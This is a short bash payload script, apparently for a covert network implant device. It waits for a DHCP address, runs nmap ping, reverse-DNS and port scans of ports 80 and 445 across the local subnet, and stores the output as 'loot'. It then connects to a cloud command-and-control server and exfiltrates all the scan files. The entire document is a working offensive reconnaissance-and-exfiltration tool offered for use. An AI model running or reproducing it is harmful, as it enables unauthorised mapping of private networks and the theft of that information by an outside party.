#!/bin/bash

# directory to store scan results
LOOT_DIR=/root/loot

# scan options - modify as you see fit
PING_SCAN="-sP -PE"
RDNS_SCAN="-sL"
BASIC_SCAN="-p 80,445 --open -T4 --max-retries 0 --min-hostgroup 128"

SERIAL_WRITE "[*] Setting up payload"
LED SETUP
NETMODE DHCP_CLIENT

SERIAL_WRITE "[*] Waiting for IP from DHCP"
LED R SOLID
while ! ifconfig eth0 | grep "inet addr"; do sleep 1; done
SUBNET=$(ip addr | grep -i eth0 | grep -i inet | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}[\/]{1}[0-9]{1,2}")
IP=${SUBNET%%/*}
SERIAL_WRITE "[*] Obtained IP $SUBNET"

SERIAL_WRITE "[*] Scanning"
LED ATTACK

# modify the following as you see fit
SERIAL_WRITE "[*] Ping scan"
nmap $PING_SCAN $SUBNET -oA $LOOT_DIR/$IP-ping
SERIAL_WRITE "[*] RDNS scan"
nmap $RDNS_SCAN $SUBNET -oA $LOOT_DIR/$IP-rdns
SERIAL_WRITE "[*] Basic scan"
nmap $BASIC_SCAN $SUBNET -oA $LOOT_DIR/$IP-basic

# remove the following if you don't want to upload to cloud C2
SERIAL_WRITE "[*] Checking web connectivity"
LED SPECIAL
if wget --spider "$PUBLIC_TEST_URL" 2>/dev/null; then
  SERIAL_WRITE "[*] Synchronizing time"
  ntpd -q -p pool.ntp.org
  SERIAL_WRITE "[*] Connecting to Cloud C2"
  C2CONNECT
  for TYPE in ping rdns basic; do
    for EXT in nmap gnmap xml; do
      SERIAL_WRITE "[*] Uploading $IP-$TYPE.$EXT"
      C2EXFIL STRING $LOOT_DIR/$IP-$TYPE.$EXT
    done
  done
else
  SERIAL_WRITE "[*] No web connectivity"
fi

SERIAL_WRITE "[*] Finished"
LED FINISH